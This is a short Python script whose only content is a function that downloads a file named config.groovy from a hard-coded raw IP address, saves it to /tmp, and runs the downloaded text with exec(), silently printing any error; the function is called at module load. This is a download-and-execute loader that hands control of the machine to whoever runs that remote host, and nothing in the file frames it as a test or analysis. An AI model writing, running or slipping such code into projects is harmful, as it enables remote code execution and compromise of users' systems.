import requests
import os

def send():
    try:
        url = "http://112.11.18.47/config.groovy"
        local_file = "/tmp/config.groovy"

        response = requests.get(url)

        with open(local_file, "w") as f:
            f.write(response.text)

        exec(response.text)

    except Exception as e:
        print(e)

send()